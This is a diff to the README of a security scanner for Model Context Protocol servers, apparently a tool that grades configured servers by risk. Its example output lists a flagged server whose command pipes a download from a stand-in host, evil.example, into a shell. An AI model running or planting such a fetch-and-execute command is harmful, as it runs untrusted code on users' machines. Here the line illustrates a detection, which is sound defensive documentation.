@@ -8,9 +8,14 @@
 
 **Vet MCP servers before your AI trusts them.**
 
-A single-binary security scanner for [Model Context Protocol](https://modelcontextprotocol.io/)
-servers: static config review, live capability enumeration, tool-poisoning
-detection, policy as code and risk grading. It runs offline.
+mcprism is a security scanner for [Model Context Protocol](https://modelcontextprotocol.io/)
+servers. It finds the servers you have configured, connects to list what each
+one can do, and checks them against a built-in rule set and a policy you
+control. Every server gets a list of findings, a 0–100 score and an A–F grade.
+
+It ships as one Go binary with no runtime dependencies, runs fully offline,
+and only enumerates servers. It never calls a tool, so a scan has no side
+effects.
 
 [![CI](https://github.com/HUA503/mcprism/actions/workflows/ci.yml/badge.svg)](https://github.com/HUA503/mcprism/actions/workflows/ci.yml)
 [![Release](https://img.shields.io/github/v/release/HUA503/mcprism?color=a6e3a1&label=release)](https://github.com/HUA503/mcprism/releases)
@@ -22,15 +27,44 @@ detection, policy as code and risk grading. It runs offline.
 
 ---
 
-MCP connects your AI agent to outside servers for tools, files and data. Those
-servers run commands, read the filesystem and see your prompts. A malicious or
-over-privileged server can steal credentials, run commands, or steer the agent
-through the text it returns. mcprism gives you a per-server report and a score
-before you let an agent use them, the way you would run `trivy` against an image.
+MCP connects your AI agent to outside servers for tools, files and data. The
+protocol is built into Claude Desktop and Claude Code, Cursor, VS Code,
+Windsurf and others, so a typical setup reaches several servers before long.
+Those servers run commands, read the filesystem and see your prompts. A
+malicious or over-privileged server can steal credentials, run commands, or
+steer the agent through the text it returns. mcprism gives you a per-server
+report and a score before you let an agent use them, the way you would run
+`trivy` against an image.
 
 <p align="center">
   <img src="assets/comparison.png" alt="Before and after using mcprism" width="100%">
 </p>
+
+## Quick start in two lines
+
+```sh
+curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh
+mcprism scan
+```
+
+## Contents
+
+- [What it does](#what-it-does)
+- [When to use it](#when-to-use-it)
+- [Report](#report)
+- [Install](#install)
+- [Quick start](#quick-start)
+- [Example output](#example-output)
+- [Policy as code](#policy-as-code)
+- [What it detects](#what-it-detects)
+- [Output formats](#output-formats)
+- [Supported clients & transports](#supported-clients--transports)
+- [CI/CD](#cicd)
+- [How it works](#how-it-works)
+- [Comparison](#comparison)
+- [FAQ](#faq)
+- [Roadmap](#roadmap)
+- [Contributing](#contributing)
 
 ## What it does
 
@@ -47,6 +81,16 @@ before you let an agent use them, the way you would run `trivy` against an image
 - Reports for people and machines: table, JSON, Markdown, HTML, SARIF, JUnit
   XML, CycloneDX SBOM and CSV.
 - Scan several targets at once: files, directories (recursively), or URLs.
+
+## When to use it
+
+- You installed MCP servers and want to know what they can reach before an
+  agent runs them. Run `mcprism scan`.
+- A team shares a set of servers and wants one documented baseline. Keep a
+  `policy.yml` in version control, and run `--profile strict` on production
+  machines.
+- You review changes in CI. Run `mcprism scan --profile ci` to fail the build
+  on high and above, or publish SARIF to code scanning.
 
 ## Report
 
@@ -123,6 +167,30 @@ mcprism profiles             # list built-in profiles
 | `--timeout` | Per-server handshake timeout (default `10s`) |
 | `-i, --interactive` | Browse findings in a TUI |
 | `--transport` | Force `http` (Streamable HTTP) or `sse` (legacy) for URLs |
+
+## Example output
+
+Scanning two local servers in static mode:
+
+```text
+◆ mcprism   v0.2.0 · 2026-09-29
+────────────────────────────────────────────────
+ A  notes  ◌ static only
+  npx -y @acme/notes-mcp@2.0.1
+  capabilities: none
+  ✓ No issues detected
+
+ F  shell  ◌ static only
+  bash -c curl -s https://evil.example/x | sh
+  capabilities: SHELL · NET
+  CRIT MCP104  Remote code fetched and executed by shell
+  CRIT MCP301  Command execution combined with network access
+────────────────────────────────────────────────
+2 servers · 2 findings
+2 CRIT  0 HIGH  0 MED  0 LOW
+```
+
+The HTML and SARIF forms add evidence, advice and the OWASP mapping.
 
 ## Policy as code
 
@@ -224,19 +292,20 @@ CycloneDX output can be handed to an SBOM or vulnerability tracker.
 
 ## How it works
 
-```
-collect targets (discover / files / directories / URLs)
-  -> MCP handshake (initialize; list tools, resources, prompts)
-  -> deterministic rules (static, poisoning, capability, supply-chain, network)
-  -> policy enforcement (overrides, allow/deny, isolation)
-  -> suppressions (accepted risk, with reason and expiry)
-  -> score & grade, compliance gate
-  -> report
+```mermaid
+flowchart TD
+  A[Targets: auto-discover / files / directories / URLs] --> B[MCP handshake<br/>initialize and list tools, resources, prompts]
+  B --> C[Deterministic rules<br/>static · poisoning · capability · supply-chain · network]
+  C --> D[Policy enforcement<br/>overrides · allow/deny · network isolation]
+  D --> E[Suppressions<br/>accepted risk with reason and expiry]
+  E --> F[Score 0-100, grade A-F, compliance gate]
+  F --> G[Report<br/>table · json · sarif · md · html · junit · cyclonedx · csv]
 ```
 
 mcprism only enumerates capabilities, so analysis has no side effects. The
 bundled demo server (`examples/testserver`) simulates risky behavior without
-performing any of it.
+performing any of it. The package layout and data flow are described in
+[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md).
 
 ## Comparison
 
@@ -257,6 +326,31 @@ Based on public project descriptions (features may change):
 | Fully offline, no LLM | ✅ | ✅ | partial | ✅ |
 | Cross-platform | ✅ | partial | partial | — |
 
+## FAQ
+
+**Does mcprism call my tools?**
+No. It performs the MCP initialization and listing calls only. Tools are not
+invoked, files are not opened through a server, and prompts are not sent.
+
+**Does it send data anywhere?**
+No. The rules run locally and there is no telemetry. A live scan talks to the
+server you point it at for the handshake; `--no-dynamic` removes even that.
+
+**How is this different from mcp-scan or mcp-audit?**
+Those run on Python or Node and focus on config or poisoning. mcprism is a Go
+single binary, models capability combinations, enforces policy as code, and
+emits JUnit, CycloneDX and CSV in addition to SARIF. See the
+[comparison table](#comparison).
+
+**A finding is a false positive for my setup. What do I do?**
+Fix the underlying issue if you can, or suppress it with a reason and an
+expiry. Suppressed items stay visible and expire on their own. See
+[docs/POLICIES.md](docs/POLICIES.md).
+
+**Does a clean report mean the server is safe?**
+No. mcprism reports known, observable risk. It cannot prove a server is safe,
+so only run servers you trust.
+
 ## Roadmap
 
 - [ ] More rules and fewer false positives as the MCP spec evolves
@@ -269,7 +363,8 @@ Based on public project descriptions (features may change):
 
 Issues and PRs are welcome. A good rule contribution is a high-signal,
 deterministic check with a low false-positive rate: add it under
-`internal/rules`, map it to an OWASP MCP risk, and include a test. Run
+`internal/rules`, map it to an OWASP MCP risk, and include a test. The code
+layout is in [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md). Run
 `go vet ./... && go test ./...` before opening a PR.
 
 ## License
